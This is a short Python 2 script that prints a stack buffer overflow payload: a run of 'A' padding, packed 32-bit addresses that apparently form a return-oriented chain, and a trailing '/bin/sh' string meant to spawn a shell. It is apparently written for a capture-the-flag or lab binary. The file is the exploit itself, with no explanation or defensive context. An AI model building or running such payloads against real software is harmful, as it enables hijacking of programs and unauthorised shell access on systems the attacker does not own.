from struct import pack

print ('A' * 0x6c + pack('<IIII', 0xbffe8b98+40, 0x0806669a, 0xbffe8b2c, 0x080643e8) + 'A' * 8 + pack('<I', 0x0808ff7d) + pack('<I', 0xbffe8c2c) + 'A' * 8 + pack('<II', 0xbffe8c2c, 0x08050bbc) + 'A' * 12 +  pack('<II', 0x41414141, 0x08050bbc) * 10 + pack('<II', 0x41414141, 0x08055d70) + '/bin/sh')
